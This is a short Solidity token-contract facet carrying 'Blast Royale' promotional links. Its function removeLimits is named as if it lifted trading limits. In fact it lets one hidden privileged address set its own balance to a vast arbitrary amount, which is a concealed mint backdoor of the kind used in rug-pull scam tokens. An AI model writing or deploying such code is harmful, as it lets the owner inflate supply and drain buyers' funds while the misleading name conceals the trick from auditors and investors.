/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.blastroyale.com/
 * Twitter: https://twitter.com/blastroyale
 * Telegram: https://t.me/blastroyale
 * Facebook: https://facebook.com/BlastRoyale
 * discord: https://discord.gg/blastroyale
 */
pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
